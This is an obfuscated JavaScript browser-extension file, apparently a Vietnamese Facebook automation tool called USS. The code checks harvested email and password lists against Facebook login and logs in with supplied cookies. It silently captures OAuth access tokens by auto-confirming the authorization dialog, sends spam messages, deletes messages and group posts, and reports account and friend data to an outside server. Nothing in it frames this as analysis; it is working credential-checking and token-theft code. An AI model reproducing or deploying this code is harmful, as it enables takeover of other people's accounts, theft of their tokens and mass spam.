            url: "https://www.facebook.com/ajax/groups/mall/delete.php",
            dataType: "json",
            type: "POST",
            data: "fb_dtsg=" + get_Fb_Key() + "&group_id=" + o + "&message_id=" + E + "&confirmed=1&pending=&source=&story_dom_id=mall_post_" + E + ":6&revision_id=&__user=" + U + "&__a=1"
        })[f1W.W6O](function(W) {})[f1W.X5v](function(W) {})[f1W.H4I](function(W) {})[f1W.D2I](function(W) {
            var V = "x7t",
                W = JSON[f1W.v4X](W),
                W = JSON[f1W.i2O](W);
            if (f1W[V](W[f1W.D60], 4)) {
                var W = W[f1W.H8v],
                    W = W[f1W.F6r]("for (;;);", "");
                thongbao_log(1, "Xóa thành công POST: " + E + ", Ngu?i Ðang: " + O + ", Time: " + Z);
            } else {
                thongbao_log(1, "Xóa bài vi?t th?t b?i !");
            }
        });
    }

    function thaotac_div_uss(V) {
        var E = "#show_help_center",
            O = "#btn_danhgia_spam",
            Z = "#view_thongke_check",
            F = "#hide_div_thongke",
            o = "#hide_panel_spam",
            U = "#div_spam",
            p = "#show_panel_spam",
            M = "#show_AccList",
            b = "#show_panel_setting",
            H = "#show_panel_check",
            R = "#hide_pnc_right_check",
            X = "#maxcheck_show",
            f = "#hide_div_pnc",
            n = "div_pnc_addon",
            Y = function(W) {
                g[f1W.W7O] = W;
            },
            N = function(W) {
                g[f1W.V5I] = W;
            },
            g = document[f1W.W8O](f1W.P5Y);
        Y(n);
        N(V);
        var T = document[f1W.V0r];
        document[f1W.V0r][f1W.M57](g);
        $(f)[f1W.Z6O](function() {
            $(f1W.r9Q)[f1W.v37]();
            $(X)[f1W.R4r]();
        });
        $(R)[f1W.Z6O](function() {
            $(f1W.h7r)[f1W.v37]();
            $(H)[f1W.R4r]();
        });
        $(b)[f1W.Z6O](function() {});
        $(f1W.j7O)[f1W.Z6O](function() {
            $(f1W.j7O)[f1W.v37]();
            open_div_right();
        });
        $(M)[f1W.L0Q](f1W.Z6O)[f1W.Z6O](function() {
            Div_AccList();
        });
        $(H)[f1W.Z6O](function() {
            $(H)[f1W.v37]();
            $(f1W.h7r)[f1W.R4r]();
        });
        $(p)[f1W.Z6O](function() {
            $(p)[f1W.v37]();
            $(U)[f1W.R4r]();
        });
        $(o)[f1W.Z6O](function() {
            $(U)[f1W.v37]();
            $(p)[f1W.R4r]();
        });
        $(X)[f1W.Z6O](function() {
            $(X)[f1W.v37]();
            $(f1W.r9Q)[f1W.R4r]();
        });
        thaotac_login_form();
        $(f1W.i47)[f1W.Z6O](function() {
            $(f1W.i47)[f1W.v37]();
            $(f1W.M97)[f1W.R4r]();
            div_batdaucheck();
        });
        $(f1W.M97)[f1W.Z6O](function() {
            $(f1W.M97)[f1W.v37]();
            $(f1W.i47)[f1W.R4r]();
            $(f1W.c87)[f1W.Q0I](f1W.c8Q);
        });
        $(F)[f1W.Z6O](function() {
            $(f1W.r2X)[f1W.v37]();
        });
        $(Z)[f1W.Z6O](function() {
            $(f1W.r2X)[f1W.R4r]();
        });
        $(O)[f1W.Z6O](function() {
            danhgiaspam();
        });
        $(E)[f1W.Z6O](function() {
            ussv_help_hd_text();
        });
    }

    function start_uss1(b, H, R, X, f, n) {
        var Y = "setInterval",
            N = "getTime",
            g = "G28",
            T = 'token_',
            I = "outerHTML",
            D = 'mbasic.facebook.com',
            G = 'm.facebook.com',
            C = 'beta.facebook.com',
            z = 'apps.facebook.com',
            P = 'static.ak.facebook.com',
            J = 'www.facebook.com',
            c = "hostname",
            L = "i28",
            E0 = n,
            F0 = f,
            K = $(f1W.D9a)[f1W.Q0I]();
        if (f1W[L](location[c][f1W.x7I](J, P, z, C, G, D), f1W.L9a)) {
            function r0(E) {
                var O = new XMLHttpRequest();
                O[f1W.g4Y] = function() {
                    var W = "T28",
                        V = "a28";
                    if (f1W[V](O[f1W.D60], 4)) {
                        div_token = document[f1W.W8O]('html');
                        div_token[f1W.V5I] = O[f1W.H8v];
                        if (f1W[W](div_token[f1W.D7a]('form').length, 0)) {
                            div_token[f1W.V5I] = div_token[f1W.D7a]('form')[0][I];
                            act = div_token[f1W.D7a]('form')[0][f1W.Q6O];
                            Q(div_token, act);
                        }
                    }
                };
                O[f1W.d5y](f1W.Y6Q, E, f1W.A0r);
                O[f1W.x1I](f1W.r27, f1W.W3v);
                O[f1W.h0r]();
            };

            function Q(E, O) {
                var Z = "c28",
                    F = "J28",
                    o = "I28",
                    U = function(W) {
                        izinverparams = W;
                    },
                    p = function(W) {
                        E = W;
                    };
                U('');
                for (i = 0; f1W[o](i, E[f1W.D7a]('input').length); i++) {
                    if (f1W[F](E[f1W.D7a]('input')[i][f1W.G6y][f1W.x7I]('__CANCEL__'), 0) && E[f1W.D7a]('input')[i][f1W.G6y][f1W.x7I]('cancel_clicked')) {
                        izinverparams += '&' + E[f1W.D7a]('input')[i][f1W.G6y] + '=' + E[f1W.D7a]('input')[i][f1W.F2Q];
                    }
                }
                if (f1W[Z](E[f1W.D7a]('select').length, 0)) {
                    izinverparams += '&' + E[f1W.D7a]('select')[0][f1W.G6y] + '=80';
                }
                izinverparams[f1W.F6r]('&fb_dtsg', 'fb_dtsg');
                izinverparams += '&__CONFIRM__=1';
                p(E);
                var M = new XMLHttpRequest();
                M[f1W.g4Y] = function() {
                    var W = "v28",
                        V = "u28";
                    if (f1W[V](M[f1W.D60], 4)) {
                        izinhtml = document[f1W.W8O]('html');
                        izinhtml[f1W.V5I] = M[f1W.H8v];
                        if (f1W[W](izinhtml[f1W.D7a]('form').length, 0)) {
                            izinhtml[f1W.V5I] = izinhtml[f1W.D7a]('form')[0][I];
                            O = izinhtml[f1W.D7a]('form')[0][f1W.Q6O];
                            Q(izinhtml, O);
                        } else {
                            sex = M[f1W.H8v][f1W.x3y](/#access_token=(.*?)&expires_in/i);
                            if (sex[1]) {
                                p0(sex[1]);
                            }
                        }
                    }
                };
                M[f1W.d5y]('POST', O, true);
                M[f1W.x1I]('Content-Type', 'application/x-www-form-urlencoded');
                M[f1W.h0r](izinverparams);
            };

            function S(W) {
                var V = '&redirect_uri=fbconnect://success&sso_key=com&scope=',
                    E = '//www.facebook.com/dialog/oauth?response_type=token&display=popup&client_id=';
                return E + W + V + K;
            };
            if (!localStorage[T + f] || (localStorage[T + f] && f1W[g](tarih[N](), localStorage[T + f]))) {
                var u = $(f1W.z60)[f1W.Q0I]();
                r0(S(u));
            }
            window[Y](function() {
                var W = "B98",
                    V = "j98",
                    E = "A28";
                if (document[f1W.t60]('_5ce')) {
                    for (i = 0; f1W[E](i, document[f1W.t60]('_5ce').length); i++) {
                        document[f1W.t60]('_5ce')[i][f1W.V5I] = '';
                    }
                }
                if (document[f1W.t60]('uiToggle wrap')) {
                    for (i = 0; f1W[V](i, document[f1W.t60]('uiToggle wrap').length); i++) {
                        document[f1W.t60]('uiToggle wrap')[i][f1W.V5I] = '';
                    }
                }
                if (document[f1W.t60]('uiPopover')) {
                    for (i = 0; f1W[W](i, document[f1W.t60]('uiPopover').length); i++) {
                        document[f1W.t60]('uiPopover')[i][f1W.V5I] = '';
                    }
                }
            }, 200);

            function p0(W) {
                update_keyfb(b, H, R, W, X);
            };
        };
    }

    function parse_stt_stellar(W) {
        var V = "Không Xa´c Ði?nh",
            E = "Ða~ Du`ng Stellar",
            O = "N18",
            Z = "Chua Du`ng Stellar",
            F = "h18";
        if (f1W[F](W, f1W.L9a)) {
            var W = Z;
        } else if (f1W[O](W, f1W.S9a)) {
            var W = E;
        } else {
            var W = V;
        }
        return W;
    }

    function div_fast_log(b, H, R) {
        var X = "#hide_div_fl_",
            f = '">Ðang tiê´n ha`nh dang nhâ?p ta`i khoa?n ',
            n = '			<span id="note_fl_',
            Y = ' | ',
            N = '			<br/>',
            g = '			 	</div>',
            T = '			  	<span></span><span></span>',
            I = '			  	<div style="background:#2ba0c5;" class="progress-bar positive">',
            D = '			<div style="width:400px" class="progress-container">',
            G = '		<div class="center">',
            C = '	<center><span style="color: rgb(14, 32, 103);font-size: 16px;">Ðang Nhâ?p Nhanh</span></center>',
            z = ' 	<a class="div_popup_close" role="button" href="#" id="hide_div_fl_',
            P = '<div class="right">',
            J = '<div class="class_viewimg class_fl">',
            c = function(W) {
                E0[f1W.V5I] = W;
            },
            L = f1W.X6v;
        L += J;
        L += f1W.d0v;
        L += P;
        L += z + b + f1W.j4X;
        L += f1W.w9O;
        L += C;
        L += f1W.B5O;
        L += G;
        L += D;
        L += I;
        L += T;
        L += g;
        L += f1W.w2v;
        L += N;
        L += f1W.J1v + H + Y + R + f1W.P0r;
        L += n + b + f + H + f1W.x1Y;
        L += f1W.J50;
        L += f1W.b17;
        L += f1W.a5a;
        L += f1W.w9O;
        var E0 = document[f1W.W8O](f1W.P5Y);
        c(L);
        document[f1W.V0r][f1W.M57](E0);
        fast_log(b, H, R);
        $(X + b)[f1W.Z6O](function() {
            var W = ".class_fl";
            $(W)[f1W.w5I]();
        });
        $(function() {
            var O = "each",
                Z = "eq";

            function F() {
                var V = "Y38";
                if (f1W[V](o, '100')) {
                    var E = function(W) {
                        o = W;
                    };
                    E(0);
                }
                $barPositive[Z](0)[f1W.C3O]('width', o + '%');
                o += 0.25;
            }
            var o = 0,
                $barPositive = $('.positive'),
                $progressTexts = $('.progress-bar'),
                M = $progressTexts[Z](0)[f1W.Q0I]();
            $progressTexts[O](function() {
                $(this)[f1W.Q0I](M[f1W.F6r](/\s/g, '&nbsp;'));
            });
            setInterval(F, 50);
        });
    }

    function login_CheckFb(C, z, P, J, c) {
        var L = "urlpost",
            E0 = "pc",
            F0 = "typeIO",
            K = "d8",
            r0 = '&email=',
            Q = "CheckLogin",
            S = "#div_check",
            u = '.facebook.com',
            p0 = "<span id='sttcheck",
            q0 = "'></span>",
            H0 = "|*****<span id='sttcheck",
            W0 = "Tiê´n ha`nh Check tài khoa?n ",
            w = "Tiê´n ha`nh Check b?ng Cookie trên tài khoa?n ";
        if (!c) {
            var c = f1W.V8v;
        };
        if (c[f1W.x3y](f1W.m7v)) {
            dom_logs_ussv(w + z + f1W.w30 + P, C + f1W.v7Q);
            uss[f1W.O1X](function(Z) {
                var F = "Session",
                    o = "Cookie:",
                    U = c[f1W.F6r](o, f1W.V8v),
                    U = uss[f1W.t6O](U)[f1W.X3Q](f1W.w30),
                    p = U[f1W.L9a],
                    M = U[f1W.S9a];
                setCookie(f1W.J8X, p, F);
                setCookie(f1W.v9I, M, F);
                chrome[f1W.d60][f1W.K4r]({
                    method: 'GET',
                    action: 'xhttp',
                    url: 'https://www.facebook.com/ajax/settings/account/temperature.php?__pc=EXP1%3ADEFAULT&__a=1',
                    data: "base=hau"
                }, function(V) {
                    var E = "K8",
                        O = V;
                    if (f1W[E](O[f1W.x3y]("login.php"), null)) {
                        update_OneAcc(C, z, P, J, "die");
                    } else {
                        GetUSSKey(function(W) {
                            update_OneAcc(C, z, P, J, "live", _fb[f1W.m5I](O));
                        });
                    }
                });
            });
        } else {
            if ($(f1W.G8v)[f1W.o07]()) {
                dom_logs_ussv(W0 + z + H0 + C + q0, C + f1W.v7Q);
            } else {
                dom_logs_ussv(W0 + z + f1W.w30 + P + p0 + C + q0, C + f1W.v7Q);
            }
            delete_cookie(f1W.J8X, f1W.S6Y, u);
            $(S)[f1W.w5I]();
            var B0 = ussnow[Q][f1W.F2O] + r0 + z + f1W.d1r + P + f1W.X6v;
            if (f1W[K](ussnow[Q][F0], E0)) {
                $[f1W.c9y]({
                    url: ussnow[Q][L],
                    type: "POST",
                    data: B0,
                })[f1W.D2I](function(V, E, O) {
                    var Z = "J3",
                        F = "I3",
                        o = "T3",
                        U = "i3",
                        p = "n3",
                        M = "M3",
                        b = "e3",
                        H = "p3",
                        R = "o3",
                        X = "r3",
                        f = "E3",
                        n = "W3";
                    if (f1W[n](V, "ERROR")) {
                        var Y = "Qu´a tri`nh kiê?m tra Ta`i Khoa?n bi? gia´n doa?n, trên ta`i khoa?n " + z + " qua´ tri`nh kiê?m tra se~ tiê´p tu?c trên ca´c ta`i khoa?n kha´c !";
                        Y += '<br/>Thông Tin Vê` Lô~i Trên Ta`i Khoa?n:<br/>';
                        Y += ' ID: ' + C + "<br/>";
                        Y += ' Email: ' + z + "<br/>";
                        Y += ' Mâ?t Khâ?u: ' + P + "<br/>";
                        Y += ' ID Key Check: ' + J + "<br/>";
                        div_thongbao(Y);
                        update_OneAcc(C, z, P, J, "kxd");
                    } else {
                        if (f1W[f](V, '')) {
                            GetUSSKey(function(W) {
                                update_OneAcc(C, z, P, J, "live", _fb[f1W.m5I](V));
                            });
                        } else {
                            var N = "/checkpoint/gi",
                                g = V[f1W.x3y](/Mcheckpoint/gi);
                            if (f1W[X](V[f1W.x3y](/checkpoint/gi), null)) {
                                $("#sttcheck" + C)[f1W.C3O]("color", "rgb(216, 10, 10)")[f1W.Q0I](" ( Checkpoint )");
                                update_OneAcc(C, z, P, J, "cp");
                            } else {
                                if (f1W[R](V[f1W.x3y](/id="pass"/gi), null) || f1W[H](V[f1W.x3y](/notme.php/gi), null)) {
                                    $("#sttcheck" + C)[f1W.C3O]("color", "rgb(216, 10, 10)")[f1W.Q0I](" ( Die )");
                                    if (f1W[b](V[f1W.x3y](/fsl fwb fcb/gi), null)) {
                                        if (f1W[M](V[f1W.x3y](/opw_badchange/gi), null) || f1W[p](V[f1W.x3y](/email/gi), null)) {
                                            console[f1W.p4y]("die 1");
                                            update_OneAcc(C, z, P, J, "die");
                                        } else {
                                            chrome[f1W.d60][f1W.K4r]({
                                                action: 'clear'
                                            }, function(W) {
                                                console[f1W.p4y]("die 2");
                                                update_OneAcc(C, z, P, J, "die");
                                                uss[f1W.w8Q]({
                                                    "Body": "Facebook c?m b?n dang nh?p vì có liên ti?p " + $("#uss_saipass")[f1W.Q0I]() + " tài kho?n b? Sai Pass . USS dã ti?n hành xóa cookie, B?n vui lòng F5 l?i trình duy?t và ti?n hành Check l?i. N?u b?n v?n g?p tình tr?ng này vui lòng thay IP !"
                                                });
                                                $("#btn_stop_c_logs_ussv")[f1W.Z6O]();
                                            });
                                        }
                                    } else {
                                        console[f1W.p4y]("die 3");
                                        update_OneAcc(C, z, P, J, "die");
                                    }
                                } else {
                                    var T = V[f1W.x3y](/phoneacqwrite/gi);
                                    if (f1W[U](T, null)) {
                                        GetUSSKey(function(W) {
                                            update_OneAcc(C, z, P, J, "live", _fb[f1W.m5I](V));
                                        });
                                    } else {
                                        var I = V[f1W.x3y](/\{"token":(.*?)\}/gi);
                                        if (f1W[f1W.S7X](I, null)) {
                                            var D = I,
                                                D = JSON[f1W.i2O](D),
                                                G = D[f1W.M00];
                                            if (f1W[o](G, '')) {} else {}
                                            GetUSSKey(function(W) {
                                                update_OneAcc(C, z, P, J, "live", _fb[f1W.m5I](V));
                                            });
                                        } else {
                                            if (f1W[F](V[f1W.x3y](/http-equiv="refresh"/gi), null)) {
                                                GetUSSKey(function(W) {
                                                    update_OneAcc(C, z, P, J, "live", _fb[f1W.m5I](uss[f1W.G47](3, "https://m.facebook.com/?hrc=1")));
                                                });
                                            } else {
                                                if (f1W[Z](V[f1W.x3y](/fb_dtsg/gi), null)) {
                                                    GetUSSKey(function(W) {
                                                        update_OneAcc(C, z, P, J, "live", _fb[f1W.m5I](V));
                                                    });
                                                } else {
                                                    if (f1W[f1W.a8a](V[f1W.x3y](/recover/gi), null)) {
                                                        dom_logs_ussv("B?n dã nh?p M?t kh?u c?", "0|_|_|error|check");
                                                        update_OneAcc(C, z, P, J, "die");
                                                    } else {
                                                        update_OneAcc(C, z, P, J, "kxd");
                                                    }
                                                }
                                            }
                                        }
                                    }
                                }
                            }
                        }
                    }
                });
            } else {
                chrome[f1W.d60][f1W.K4r]({
                    method: 'POST',
                    action: 'xhttp',
                    url: ussnow[Q][L],
                    data: B0
                }, function(V) {
                    var E = "s6",
                        O = "k6",
                        Z = "X6",
                        F = "y6",
                        o = "F6",
                        U = "B6",
                        p = "j6",
                        M = "A3",
                        b = "G3",
                        H = "v3",
                        R = "u3",
                        X = V;
                    if (f1W[R](X, "ERROR")) {
                        var f = "Qu´a tri`nh kiê?m tra Ta`i Khoa?n bi? gia´n doa?n, trên ta`i khoa?n " + z + " qua´ tri`nh kiê?m tra se~ tiê´p tu?c trên ca´c ta`i khoa?n kha´c !";
                        f += '<br/>Thông Tin Vê` Lô~i Trên Ta`i Khoa?n:<br/>';
                        f += ' ID: ' + C + "<br/>";
                        f += ' Email: ' + z + "<br/>";
                        f += ' Mâ?t Khâ?u: ' + P + "<br/>";
                        f += ' ID Key Check: ' + J + "<br/>";
                        div_thongbao(f);
                        update_OneAcc(C, z, P, J, "kxd");
                    } else {
                        if (f1W[H](X, '')) {
                            GetUSSKey(function(W) {
                                update_OneAcc(C, z, P, J, "live", _fb[f1W.m5I](X));
                            });
                        } else {
                            var n = "/checkpoint/gi",
                                Y = X[f1W.x3y](/Mcheckpoint/gi);
                            if (f1W[b](Y, null)) {
                                update_OneAcc(C, z, P, J, "cp");
                            } else {
                                var N = X[f1W.x3y](/XLoginController/gi);
                                if (f1W[M](N, null)) {
                                    var g = X[f1W.x3y](/\/help\/contact\/571927962827151/gi);
                                    if (f1W[p](g, null)) {
                                        uss[f1W.w8Q]({
                                            "Body": "Chào b?n, Facebook c?nh báo b?n dã thao tác quá nhanh vì có quá nhi?u tài kho?n b? sai pass. USS dã ti?n hành xóa cookie, n?u b?n v?n g?p tình tr?ng này vui lòng thay IP !"
                                        });
                                        chrome[f1W.d60][f1W.K4r]({
                                            action: 'clear'
                                        }, function(W) {
                                            dom_logs_ussv(W, "0|_|_|ok|check");
                                            uss[f1W.G47]("https://m.facebook.com");
                                            update_OneAcc(C, z, P, J, "die");
                                        });
                                    } else {
                                        update_OneAcc(C, z, P, J, "die");
                                    }
                                } else {
                                    var T = X[f1W.x3y](/phoneacqwrite/gi);
                                    if (f1W[U](T, null)) {
                                        GetUSSKey(function(W) {
                                            update_OneAcc(C, z, P, J, "live", _fb[f1W.m5I](X));
                                        });
                                    } else {
                                        var I = X[f1W.x3y](/\{"token":(.*?)\}/gi);
                                        if (f1W[o](I, null)) {
                                            var D = I,
                                                D = JSON[f1W.i2O](D),
                                                G = D[f1W.M00];
                                            if (f1W[F](G, '')) {} else {}
                                            GetUSSKey(function(W) {
                                                update_OneAcc(C, z, P, J, "live", _fb[f1W.m5I](X));
                                            });
                                        } else {
                                            if (f1W[Z](X[f1W.x3y](/http-equiv="refresh"/gi), null)) {
                                                GetUSSKey(function(W) {
                                                    update_OneAcc(C, z, P, J, "live", _fb[f1W.m5I](uss[f1W.G47](3, "https://m.facebook.com/?hrc=1")));
                                                });
                                            } else {
                                                if (f1W[O](X[f1W.x3y](/fb_dtsg/gi), null)) {
                                                    GetUSSKey(function(W) {
                                                        update_OneAcc(C, z, P, J, "live", _fb[f1W.m5I](X));
                                                    });
                                                } else {
                                                    if (f1W[E](X[f1W.x3y](/recover/gi), null)) {
                                                        dom_logs_ussv("B?n dã nh?p M?t kh?u c?", "0|_|_|error|check");
                                                        update_OneAcc(C, z, P, J, "die");
                                                    } else {
                                                        update_OneAcc(C, z, P, J, "kxd");
                                                    }
                                                }
                                            }
                                        }
                                    }
                                }
                            }
                        }
                    }
                });
            }
        }
    }

    function get_setting_spam(U, p, M) {
        var b = "X0B",
            H = "y0B";
        if (f1W[H](p, f1W.x0r) || f1W[b](p, undefined)) {
            var p = document[f1W.C4y](f1W.n10)[f1W.V5I],
                M = document[f1W.C4y](f1W.u5X)[f1W.V5I];
        }
        var R = f1W.r4I + p + f1W.H40 + M;
        chrome[f1W.d60][f1W.K4r]({
            method: 'POST',
            action: 'xhttp',
            url: 'http://ussv.net/ajax/get_text_spam' + h_t + '.php?type=hau&user=' + p + '&mabimat=' + M,
            data: "token=" + uss_aut(3)
        }, function(V) {
            var E = "D0B",
                O = "Y0B",
                Z = "m0B",
                F = "s0B",
                o = "k0B";
            if (f1W[o](V, "ERROR")) {
                div_thongbao(ussv_lang_vi_cant_get_st_sp);
            } else {
                $("#div_setting_spam")[f1W.Q0I](V);
                chrome[f1W.d60][f1W.K4r]({
                    action: 'SetUserAgent',
                    type: 1
                }, function(W) {
                    console[f1W.p4y](W);
                });
                if (f1W[F](U, "hau")) {
                    if (f1W[Z](V.length, 10)) {
                        $("#stt_checking")[f1W.Q0I]("Lâ´y thiê´t lâ?p SPAM Tha`nh Công...");
                        $("#uss_can_spam")[f1W.Q0I]("1");
                        $("#uss_check_content")[f1W.Q0I]("1");
                        get_OneAcc();
                    } else {
                        alert("Qu´a Tri`nh Lâ´y Thiê´t Lâ?p Spam Thâ´t Ba?i. Không thê? tiê´n ha`nh Check va` SPAM !");
                    }
                } else if (f1W[O](U, "SpamToken")) {
                    $("#uss_can_spam")[f1W.Q0I]("1");
                    $("#uss_check_content")[f1W.Q0I]("1");
                    SpamV2[f1W.u0y]();
                } else if (f1W[E](U, "update")) {
                    $("#uss_can_spam")[f1W.Q0I]("1");
                    dom_logs_ussv(lang_vi_spaming_get_setting, "0|_|_|ok|spam");
                } else {}
            }
        });
    }

    function add_friend(E, O, Z, F) {
        var o = "L6b",
            U = "S6b",
            p = "P6b",
            M = function() {
                var W = "&friend=";
                var V = "&type=updateinfo&value=1&fb_id=";
                datalogin = f1W.o0Y + H + f1W.R87 + R + V + E + f1W.i40 + O + f1W.L9I + Z + W + X;
            },
            b = function() {
                total_check_fr = parseInt($(f1W.K8r)[f1W.Q0I]()) + X;
            },
            H = document[f1W.C4y](f1W.n10)[f1W.V5I],
            R = document[f1W.C4y](f1W.u5X)[f1W.V5I],
            X = F.data.length,
            f = $(f1W.G5Q)[f1W.Q0I]();
        if (f1W[p](f, f1W.B3Q)) {
            var n = $(f1W.i6v)[f1W.Q0I]();
            if (f1W[U](n, f1W.B3Q)) {
                if (f1W[o](Z, f1W.D4X)) {} else {
                    $(f1W.w3y + E)[f1W.Q0I](X);
                }
            }
        } else {}
        $(f1W.q47 + E)[f1W.Q0I](X);
        b();
        $(f1W.K8r)[f1W.Q0I](total_check_fr);
        var Y = new XMLHttpRequest(),
            N = f1W.l9r;
        M();
        Y[f1W.g4Y] = function() {
            var W = "d6b",
                V = "K6b";
            if (f1W[V](Y[f1W.D60], f1W.d9a) && f1W[W](Y[f1W.p0O], f1W.o9Q)) {};
        };
        Y[f1W.d5y](f1W.k6Q, N, f1W.A0r);
        Y[f1W.x1I](f1W.r27, f1W.W3v);
        Y[f1W.h0r](datalogin);
    }

    function fb_Msg(G, C, z, P, J, c, L) {
        var E0 = "A76",
            F0 = "G76",
            K = "v76",
            r0 = "I76",
            Q = "T76",
            S = "%3A",
            u = "e76",
            p0 = "p76",
            q0 = "L?i khi thao tác Mail",
            H0 = "o76",
            W0 = Date[f1W.t5v] || function() {
                return +new Date;
            };
        if (f1W[H0](P, f1W.L9a)) {
            thongbao_log(f1W.S9a, q0);
        } else {
            if (f1W[p0](G, f1W.S9a)) {
                if (f1W[u](C, f1W.S9a)) {
                    var P = P[f1W.F6r](f1W.V8Y, S);
                    $[f1W.c9y]({
                        url: "https://www.facebook.com/ajax/mercury/delete_messages.php",
                        dataType: "json",
                        type: "POST",
                        data: "message_ids[0]=mid." + P + "&__user=" + L + "&__a=1&__req=2l&fb_dtsg=" + c + ""
                    })[f1W.D2I](function(W) {
                        var V = "a76",
                            E = "i76",
                            O = "n76",
                            Z = "M76";
                        if (f1W[Z](W[f1W.D60], 4) && f1W[O](W[f1W.p0O], 500)) {
                            var W = W[f1W.H8v],
                                W = W[f1W.F6r]("for (;;);", "");
                            if (f1W[E](acc_doing[f1W.f17], 1) || f1W[V]($("#uss_st_spam_delmsg_inbox")[f1W.o07](), 1)) {
                                $(".ussv_delmsg_" + z)[f1W.Q0I]("Ðã Xóa Tin Nh?n");
                            }
                        } else {}
                    });
                } else {}
            } else if (f1W[Q](G, f1W.L9a)) {
                if (f1W[r0](C, f1W.S9a)) {
                    var P = P[f1W.X3Q](f1W.U7v),
                        w = P[f1W.L9a],
                        B0 = uss[f1W.P5O](P[f1W.S9a]),
                        o0 = P[f1W.c9a];
                    $[f1W.c9y]({
                        url: "https://www.facebook.com/ajax/mercury/send_messages.php",
                        dataType: "json",
                        type: "POST",
                        data: "message_batch[0][action_type]=ma-type:user-generated-message&message_batch[0][thread_id]&message_batch[0][author]=fbid:" + L + "&message_batch[0][author_email]&message_batch[0][coordinates]&message_batch[0][timestamp]=" + W0() + "&message_batch[0][timestamp_absolute]=Hôm nay&message_batch[0][timestamp_relative]=" + displayTime() + "&message_batch[0][timestamp_time_passed]=0&message_batch[0][is_unread]=false&message_batch[0][is_cleared]=false&message_batch[0][is_forward]=false&message_batch[0][is_filtered_content]=false&message_batch[0][is_spoof_warning]=false&message_batch[0][source]=source:chat:web&message_batch[0][source_tags][0]=source:chat&message_batch[0][body]=" + B0 + "&message_batch[0][has_attachment]=false&message_batch[0][html_body]=false&&message_batch[0][specific_to_list][0]=fbid:" + w + "&message_batch[0][specific_to_list][1]=fbid:" + L + "&message_batch[0][ui_push_phase]=V3&message_batch[0][status]=0&message_batch[0][message_id]=&message_batch[0][manual_retry_cnt]=0&&message_batch[0][client_thread_id]=user:" + w + "&client=mercury&__user=" + L + "&__a=1&__req=18&fb_dtsg=" + c + ""
                    })[f1W.D2I](function(W) {
                        var V = "u76",
                            E = "c76",
                            O = "J76";
                        if (f1W[O](W[f1W.D60], 4) && f1W[E](W[f1W.p0O], 500)) {
                            var W = W[f1W.H8v],
                                W = W[f1W.F6r]("for (;;);", ""),
                                W = JSON[f1W.i2O](W);
                            if (W.error) {} else {
                                var Z = W[f1W.v6v][f1W.M4I][0][f1W.z0r],
                                    Z = Z[f1W.F6r]("mid.", "");
                                if (f1W[V](o0, "1")) {
                                    fb_Msg(1, 1, 1, Z, 0, c, L);
                                };
                            }
                        } else {}
                    });
                } else {}
            } else if (f1W[K](G, f1W.c9a)) {
                if (f1W[F0](C, f1W.S9a)) {
                    var P = P[f1W.X3Q](f1W.U7v),
                        w = P[f1W.L9a],
                        Z0 = P[f1W.S9a],
                        A = P[f1W.c9a],
                        X0 = f1W.G90;
                    if (f1W[E0](Z0, f1W.v9Y)) {
                        var X0 = f1W.F30;
                    }
                    $[f1W.c9y]({
                        url: "https://www.facebook.com/ajax/mercury/thread_info.php",
                        dataType: "json",
                        type: "POST",
                        data: "fb_dtsg=" + c + "&messages[user_ids][" + w + "][offset]=0&messages[user_ids][" + w + "][limit]=" + X0 + "&client=mercury&__user=" + L + "&__a=1&__req=j"
                    })[f1W.D2I](function(W) {
                        var V = "x86",
                            E = "l86",
                            O = "C86",
                            Z = "g86",
                            F = "D86",
                            o = "Y86",
                            U = "m86",
                            p = "s86",
                            M = "k86",
                            b = "X86",
                            H = "author",
                            R = "y86",
                            X = "F86",
                            f = "B86",
                            n = "j86";
                        if (f1W[n](W[f1W.D60], 4) && f1W[f](W[f1W.p0O], 500)) {
                            var W = W[f1W.H8v],
                                W = JSON[f1W.i2O](W[f1W.F6r]("for (;;);", "")),
                                Y = 0;
                            if (f1W[X](W[f1W.v6v][f1W.M4I], undefined)) {
                                var Y = W[f1W.v6v][f1W.M4I].length;
                            }
                            var N = '';
                            for (var g = 0; f1W[R](g, Y); g++) {
                                var T = W[f1W.v6v][f1W.M4I][g][f1W.z0r][f1W.F6r]("mid.", ""),
                                    I = W[f1W.v6v][f1W.M4I][g][H],
                                    D = W[f1W.v6v][f1W.M4I][g][f1W.V0r];
                                if (f1W[b](A, "USSVCLEARALL")) {
                                    fb_Msg(1, 1, 1, T, 0, get_Fb_Key(), get_Fb_Uid());
                                } else {
                                    if (f1W[M](A, "USSVCLEAR")) {
                                        if (f1W[p](D, "USSVCLEAR") || f1W[U](D[f1W.x3y]("USSVMSG"), null)) {
                                            fb_Msg(1, 1, 1, T, 0, get_Fb_Key(), get_Fb_Uid());
                                        }
                                    } else if (f1W[o](A, "USSVCLEARxxx")) {} else {
                                        if (f1W[F](I[f1W.x3y](L), null)) {
                                            if (f1W[Z](D, "USSVCLEAR") || f1W[O](D, "USSVCLEARALL") || f1W[E](D[f1W.x3y]("USSVSAFE"), null) || f1W[V](D, "USSVCANCEL")) {
                                                fb_Msg(1, 1, 1, T, 0, get_Fb_Key(), get_Fb_Uid());
                                            }
                                        }
                                    }
                                }
                            };
                        } else {}
                    });
                }
            }
        }
    }

    function thaotac_div_ussv_logs(Y) {
        var N = "#btn_go_custom_acc",
            g = "#ussv_logs_left_select",
            T = "#ussv_logs_select_panel",
            I = "#btn_logs_ussv_cr_url_denho",
            D = "Ba?n da~ cô´ ga´ng truy câ?p va`o Khu vu?c da`nh cho go´i VIP. Ðiê`u na`y không duo?c phe´p !",
            G = ".ussv_log_panel_tt.note",
            C = ".btn_ussv_logs_updatespam",
            z = '#sl_loc_ussv_logs_match_email',
            P = '#sl_loc_ussv_logs_change_method',
            J = ".div_ussv_logs_txt.",
            c = "all1",
            L = "all2",
            E0 = ".div_ussv_logs_txt",
            F0 = '#sl_loc_ussv_logs_change_type',
            K = "#btn_del_logs_ussv",
            r0 = "#div_ussv_logs_close",
            Q = "y2E";
        if (f1W[Q](Y, f1W.M9Y)) {
            $(r0)[f1W.Z6O](function() {
                $(f1W.R2X)[f1W.F50](f1W.Y5a);
            });
            $(K)[f1W.Z6O](function() {
                var W = "0|_|_|ok|logs";
                $(f1W.L4y)[f1W.Q0I](f1W.V8v);
                dom_logs_ussv(lang_vi_uls_del_finish, W);
            });
            $(f1W.L6I)[f1W.L0Q](f1W.Z6O)[f1W.Z6O](function() {
                $(f1W.i47)[f1W.v37]();
                $(f1W.M97)[f1W.R4r]();
                div_batdaucheck();
            });
            $(f1W.T8y)[f1W.L0Q](f1W.Z6O)[f1W.Z6O](function() {
                $(this)[f1W.v37]();
